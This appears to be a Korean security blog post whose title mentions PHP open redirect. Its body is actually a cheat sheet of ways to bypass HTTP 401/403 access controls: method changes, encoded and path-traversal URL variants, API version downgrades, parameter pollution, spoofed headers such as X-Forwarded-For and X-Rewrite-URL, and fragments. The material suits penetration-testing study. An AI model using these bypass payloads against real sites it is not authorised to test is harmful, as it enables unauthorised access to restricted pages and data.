---
layout: single
title: Open redirect (redirect for PHP header() vulnerability)
categories: Web-vuln
tag: [php, function, redirect, open redirect]
toc: true
author_profile: false
---

## HTTP 상태코드 401&403
> 특정 페이지들을 살펴보다 보면, HTTP 상태코드로 401 또는 403으로 반환되는 경우가 종종 있다.  이 두 종류의 코드는 무엇일까?

### 401 Unauthorized
> HTTP 표준에서 Unatuhorized(미승인)으로 명시하고 있지만 해당 응답의 경우 비 인증을 의미할 수 있다. 즉  클라이언트 측에서 요청을 보내게 되면, 서버로 부터의 응답을 받기 위해 인증이 이루어져야 한다는 것이다.

### 403 Forbidden
> 흔히 볼 수 있는 응답코드로 권한과 관련되어있다. 해당 요청 클라이언트가 요청한 콘텐츠에 접근할 권한을 가지고 있지 않음을 나타낸다. 서버측에서 해당 클라이언트의 접근을 거부한다는 것이다.

# Bypass 401&403

HTTP 상태코드인 401과 403은 웹 사이트 정찰 과정에서 정말 많이 만나게된다.
<br>
이러한 상태코드를 우회할 수 있는 방법은 여러가지가 존재하며, 해당 상태 코드를 만나게 되었을 때
<br>
한번쯤 시도해볼만 하다.
1. **HTTP Method 변경**  : (GET, POST, PUT, DELETE) 등과 같은 Method를 사용하여 접근을 시도해볼 수 있다.
2. **URL 인코딩 변경** : 요청 URL을 인코등 혹인 더블 인코딩 또는 유니코드 인코딩을 통해 우회 시도를 해볼 수 있다.
3. **Path Traversal** : ‘./’ 과 같은 경로조작을 통해 우회 시도를 해볼 수 있다.
4. **대소문자 변경** : 대소문자를 구별하지 않을 수 있으니, 대소문자 변경을 통해 우회 시도를 해볼 수 있다.
5. **HTTP Header 조작** : x-Forwarded, referer 와 같은 헤더를 통해 서버를 속여 우회 시도를 해볼 수 있다.
6. **URL Fragment 삽입** : URL 끝단에 Fragment를 삽입함으로써 우회를 시도해볼 수 있다.

## 1. HTTP Method 변경
HTTP 요청 Requests에는 여러 종류의 Method가 존재한다. 이를 다양하게 변경하여 요청하는것도 좋은 테스팅 방법일 수 있다.
<br>
POST 요청에서 사용되는 방식을 GET 형식으로 파라미터를 통해 요청이 가능하다.

```
methods:
    - GET
    - HEAD
    - POST
    - PUT
    - DELETE
    - CONNECT
    - OPTIONS
    - TRACE
    - PATCH

GET /admindirectory/ HTTP/1.1
POST /admindirectory/ HTTP/1.1
PUT /admindirectory/ HTTP/1.1
HEAD /admindirectory/ HTTP/1.1
```
> 추가적으로 User-Agent를 조작하여서도 우회가 가능하다.

웹 브라우저에 access 할 때 사용하는 브라우저/OS 등에 따라 제공하는 서비스가 다를 수 있다.

## 2. URL 인코딩 변경
> .. 와같은 문자들을 여러 종류의 인코딩 방법으로 우회가 가능하다.

```
Original: //admin
URL: /%2fadmin
DURL: /%252fadmin
Unicode: /%ef%bc%8fadmin
```

## 3. Path Traversal
> Path Traversal 취약점을 응용하여 401 또는 403 상태코드를 우회할 수 있다.

```
target.com/secret
target.com/%2e/secret
/secret%20
/secret%09
/secret%00
/%90/secret
/%2e/secret
/secret/
/secret/.
//secret//
/./secret
/;/secret
/.;secret
//;//secret
/secret..;/
/secret/..;/
/secret.json
/secret.css
/secret.html
/secret?
/secret??
/secret???
/secret?testparam
/secret#
/secret#test
/...
/..%00
/..%01
/..%0a
/..%0d
/..%09
/~root
/~admin
/%20/
/%2e%2e/
/%252e%252e/
/%c0%af/
/%e0%80%af
site.com/secret/
site.com/secret/.
site.com//secret//
site.com/./secret/..
site.com/;/secret
site.com/.;/secret
site.com//;//secret
site.com/secret.json –> HTTP 200 OK (ruby)
```

## 4. 대소문자 변경

```
Original: /admin
Upper: /ADMIN
```

기타 API 사용할 경우 버전변경을 통해서도 가능하다

```
/v3/users_data/1234 --> 403 Forbidden
/v1/users_data/1234 --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:[111]} --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:{“id”:111}} --> 200 OK
{"user_id":"<legit_id>","user_id":"<victims_id>"} (JSON Parameter Pollution)
user_id=ATTACKER_ID&user_id=VICTIM_ID (Parameter Pollution)
```

## #프로토콜 변경을 통해서도 가능하다.

```
protocol_versions:
    - "0.9"
    - "1.0"
    - "1.1"
    - "2"

https://trust.com -> 200 403 or 401
http://trust.com -> 200 ok
```

## 5. HTTP Header 조작
일부 HTTP Header 은 클라이언트의 IP 혹은 HOST 정보를 속일 수 있다.
<br>
예를 들어 IP 주소 필터링에만 의존하는 웹 서버가 존재한다면 X-Forwarded-For 헤더를 사용해서
<br>
손쉽게 우회를 시도해볼 수 있다.

```
사용가능 HTTP 요청 헤더
    - X-Forwarded-For
    - X-Forward-For
    - X-Forwarded-Host
    - X-Forwarded-Proto
    - Forwarded
    - Via
    - X-Real-IP
    - X-Remote-IP
    - X-Remote-Addr
    - X-Trusted-IP
    - X-Requested-By
    - X-Requested-For
    - X-Forwarded-Server
		- Host: localhost
		- X-ProxyUser-I
		- Redirect: http://localhost
    - Referer: http://localhost
    - X-Original-URL
''' 등등
```

## 6. URL Fragment 삽입

```
https://trust.com -> 200 403 or 401
http://trust.com#fragment -> 200 ok
```

## 7. X-Rewirte-URL 헤더를 통한 경로 재지정
> X-Rewrite-URL 헤더를 허용하는 서버가 존재한다면, 접근 제한이 걸린 페이지를 백엔드에서 url을 설정 하여 접근할 수 있다.

```
GET /admin/ HTTP/1.1 -> 403

GET / HTTP/1.1 -> 200 ok
X-Rewrite-URL: /admin/
```

# Referance
- https://www.hahwul.com/2021/10/08/bypass-403/
- https://www.codelivly.com/401-403-bypass-cheatsheet/
- https://www.vidocsecurity.com/blog/401-and-403-bypass-how-to-do-it-right/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses